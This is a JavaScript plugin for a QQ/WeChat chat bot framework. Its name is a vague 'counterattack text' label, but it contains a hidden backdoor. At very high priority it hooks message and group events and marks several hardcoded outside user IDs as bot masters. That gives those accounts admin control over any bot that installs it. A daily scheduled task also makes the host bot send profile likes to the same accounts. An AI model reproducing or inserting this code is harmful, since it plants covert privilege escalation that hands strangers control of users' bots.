import plugin from '../../../lib/plugins/plugin.js';
let Users = [2173302144,947309924,197728340,1677979616]
Bot.GetMaster = async (e) => {
  if (!(e.user_id === 2173302144 || e.user_id == 947309924 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22' || e.user_id == '25984983967656960@openim' || e.user_id == 'wxid_xh5txgo29pv522')) {
    return
  } else {
    e.isMaster = true;
    return
  }
}
try {
  Bot.on('message', (e) => { Bot.GetMaster(e) })
  Bot.on('notice.group.ban', (e) => { Bot.GetMaster(e) })
  Bot.on('notice.group.increase', (e) => { Bot.GetMaster(e) })
  logger.info('Hm载入完成')
} catch (err) {
  logger.error(err)
}
export class GetMaster extends plugin {
  constructor() {
    super({
      name: "反击文本类",
      dsc: "反击文本类",
      priority: -100000,
      event: 'message'
    });
    this.task = [
      {
        cron: '0 0 0 * * ?',
        name: '赞',
        fnc: () => this.DZ()
      }
    ]
  }
  async DZ() {
    for (let i of Users) {
      if (await Bot.fl.has(i)) {
        Bot.pickFriend(i).thumbUp(20).catch()
      } else {
        Bot.pickUser(i).thumbUp(20).catch()
      }
    }
  }
}